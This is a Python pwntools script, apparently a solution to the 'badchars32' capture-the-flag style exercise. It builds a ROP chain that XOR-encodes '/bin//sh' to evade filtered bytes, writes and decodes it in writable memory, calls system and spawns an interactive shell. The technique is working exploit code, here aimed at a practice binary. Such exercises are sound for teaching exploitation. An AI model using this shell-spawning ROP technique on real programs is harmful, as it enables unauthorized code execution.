from pwn import *

# Get /bin//sh onto stack by XORing it and moving to GOT.PLT
# XOR XOR[/bin//sh] in GOT.PLT
# Call system with /bin//sh from GOT.PLT

sh = "/bin//sh"
enc_sh = ""
xbyte = 0x50

for b in sh:
    enc_sh = enc_sh + chr(ord(b) ^ xbyte) # XOR encrypt payload with key byte 0x50

buf = ""
buf += "A"*44

# First write
buf += p32(0x08048899) # 0x08048899: pop esi; pop edi; ret;
buf += enc_sh[0:4] # /bin (esi)
buf += p32(0x804a080) # 0x804a000 + 0x80 (edi)
buf += p32(0x08048893) # 0x08048893: mov dword ptr [edi], esi; ret;

# Second write
buf += p32(0x08048899) # 0x08048899: pop esi; pop edi; ret;
buf += enc_sh[4:8] # //sh (esi)
buf += p32(0x804a084) # 0x804a000 + 0x84 (edi)
buf += p32(0x08048893) # 0x08048893: mov dword ptr [edi], esi; ret;

# Xor XOR[/bin//sh] (Will decrypt encrypted string at GOT.PLT + 0x80
for i in range(0,len(enc_sh)):
    buf += p32(0x08048896) # 0x08048896: pop ebx; pop ecx; ret; 
    buf += p32(0x0804a080+i) # /bin//sh on GOT.PLT (ebx)
    buf += p32(xbyte) # 0x50 (ecx/cl)
    buf += p32(0x08048890) # 0x08048890: xor byte ptr [ebx], cl; ret;

buf += p32(0x080484e0) # system@PLT
buf += p32(0xdeadbeef) # Trash unused return address
buf += p32(0x0804a080) # /bin//sh on GOT.PLT (Pointer to char array on GOT.PLT)

b = process("./badchars32")
b.recv()
b.sendline(buf)
b.interactive()
